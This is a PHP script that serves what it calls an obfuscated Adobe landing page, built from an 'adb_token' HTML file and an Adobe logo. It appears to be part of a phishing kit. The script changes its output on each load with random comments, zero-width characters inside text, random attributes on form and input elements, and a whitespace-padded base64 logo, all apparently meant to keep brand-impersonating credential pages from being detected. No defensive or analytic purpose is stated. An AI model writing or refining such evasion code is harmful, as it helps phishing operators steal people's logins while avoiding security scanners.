<?php
/**
 * Obfuscated Adobe Landing Page - Simple Working Version
 */
error_reporting(E_ALL);
ini_set('display_errors', 0);

require_once __DIR__ . '/obfuscator.php';

// Load the original HTML
$html = file_get_contents(__DIR__ . '/adb_token_original.html');

if (!$html) {
    die('Error loading page');
}

// Simple obfuscation: Add random comments throughout HTML
$randomComments = function() {
    $comments = [
        '<!-- ' . bin2hex(random_bytes(8)) . ' -->',
        '<!-- init: ' . mt_rand(1000, 9999) . ' -->',
        '<!-- render-' . substr(md5(microtime()), 0, 8) . ' -->',
    ];
    return $comments[array_rand($comments)];
};

// Insert random comments between tags
$html = preg_replace('/(<\/[^>]+>)/', '$1' . "\n" . $randomComments(), $html, 20);

// Add invisible characters to text content (simple version)
$html = preg_replace_callback('/>([^<]{5,})</s', function($matches) {
    $text = $matches[1];
    // Insert zero-width space every few characters
    $obfuscated = '';
    $chars = mb_str_split($text);
    foreach ($chars as $i => $char) {
        $obfuscated .= $char;
        if ($i % 5 === 0 && $char !== ' ') {
            $obfuscated .= "\u{200B}"; // Zero-width space
        }
    }
    return '>' . $obfuscated . '<';
}, $html);

// Add random data attributes to major elements
$html = preg_replace_callback('/<(div|button|input|form|span)([^>]*)>/', function($matches) {
    $tag = $matches[1];
    $attrs = $matches[2];
    $randomAttr = ' data-r' . substr(md5(random_bytes(4)), 0, 6) . '="' . mt_rand(1000, 9999) . '"';
    return '<' . $tag . $attrs . $randomAttr . '>';
}, $html);

// Obfuscate image sources with whitespace in base64
$html = preg_replace_callback('/src="([^"]+ad0be\.png[^"]*)"/', function($matches) use ($obfuscator) {
    $imgPath = __DIR__ . '/ad0be.png';
    if (file_exists($imgPath)) {
        return 'src="' . $obfuscator->obfuscateImage($imgPath) . '"';
    }
    return $matches[0];
}, $html);

// Output the obfuscated HTML
echo $html;
?>
